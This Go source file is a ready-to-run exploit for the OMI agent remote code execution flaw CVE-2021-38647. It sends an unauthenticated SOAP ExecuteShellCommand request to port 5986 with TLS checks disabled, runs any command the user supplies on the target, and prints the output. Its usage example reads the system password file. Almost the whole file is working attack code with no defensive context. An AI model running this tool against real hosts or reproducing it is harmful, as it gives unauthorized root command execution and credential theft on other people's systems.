package main

import (
	"bytes"
	"crypto/tls"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

type Envelope struct {
	XMLName    xml.Name `xml:"Envelope"`
	StdOut     string   `xml:"Body>SCX_OperatingSystem_OUTPUT>StdOut"`
	ReturnCode string   `xml:"Body>SCX_OperatingSystem_OUTPUT>ReturnCode"`
}

// Payload from https://github.com/midoxnet/CVE-2021-38647
var payload string = `<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
<s:Header>
   <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
   <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
   <a:ReplyTo>
	  <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
   </a:ReplyTo>
   <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
   <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
   <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
   <w:OperationTimeout>PT1M30S</w:OperationTimeout>
   <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
   <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
   <w:OptionSet s:mustUnderstand="true" />
   <w:SelectorSet>
	  <w:Selector Name="__cimnamespace">root/scx</w:Selector>
   </w:SelectorSet>
</s:Header>
<s:Body>
   <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
	  <p:command>%v</p:command>
	  <p:timeout>0</p:timeout>
   </p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>`

func checkErr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	if len(os.Args) != 3 {
		showSyntax()
	} else {
		exploit(fmt.Sprintf("https://%v:5986/wsman", os.Args[1]), os.Args[2])
	}
}

func showSyntax() {
	fmt.Printf("Usage:   %v <IP> <command>\n", os.Args[0])
	fmt.Printf("Example: %v 192.168.2.115 'cat /etc/shadow/'\n", os.Args[0])
}

func exploit(target, command string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Post(target, "application/soap+xml;charset=UTF-8", bytes.NewBuffer([]byte(fmt.Sprintf(payload, command))))

	if err != nil {
		fmt.Printf("Got an error, is %v vulnerable?\n\n", os.Args[1])
		showSyntax()
		return
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	checkErr(err)

	e := new(Envelope)
	xml.Unmarshal(body, e)

	fmt.Println(string(body))
	fmt.Println(e.StdOut, "\n", e.ReturnCode)
}
